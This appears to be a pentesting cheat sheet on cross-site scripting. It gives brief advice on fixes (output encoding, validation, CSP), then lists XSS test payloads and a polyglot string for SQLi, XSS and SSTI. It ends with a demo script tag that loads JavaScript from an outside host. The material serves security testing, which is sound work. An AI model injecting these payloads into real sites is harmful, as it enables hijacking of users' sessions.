# XSS
* XSS can do anything a logged in user can do.

* You fix XSS by fixing the output or input:
	* Output - Encode data to make it safe:
	* Input - Validation, Whitelists
* Secondarily, you protect with a Content Security Policy (CSP), which is an HTTP Header

## Testing
```html

Here's a small #XSS list for manual testing (main cases, high success rate).

"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)

Try it on:
- URL query, fragment & path;
- all input fields.

------------

A payload without any parenthesis after "prompt":

​```Object.defineProperty(window, 'p', { get: prompt });p;```

By using a Getter, we invoke the prompt without any input. This should display a prompt box in which the payload can be entered. 

------------

JS:          <script>alert('Honk');</script>
SVG:         <svg onload=prompt(/svg/) />
IMG SRC:     <img src="alert('img src')" />
IMG ONERROR: <img src="error" onerror="alert('img error')" />

http://example.com/index.php?user=<script>alert(123)</script>
```



### Quick manual spray of an application input
```html
'"><svg/onload=alert()>{{9*74}}
```
This provides indicators of basic SQLi, XSS and SSTI vulnerabilities. Always remember to rest for SSTI (Server-Side Template Injection). Test for it the same way you would for XSS. A few simple payloads like ```{{7*7}}``` and if they get replaced by '49' then you've just found a high/critical vulnerability. You need to get a PoC though!


https://github.com/payloadbox/xss-payload-list



## Demo: Harlem Shake

```html
<script defer src="https://rafaelhart.com/shake.js"></script>
```

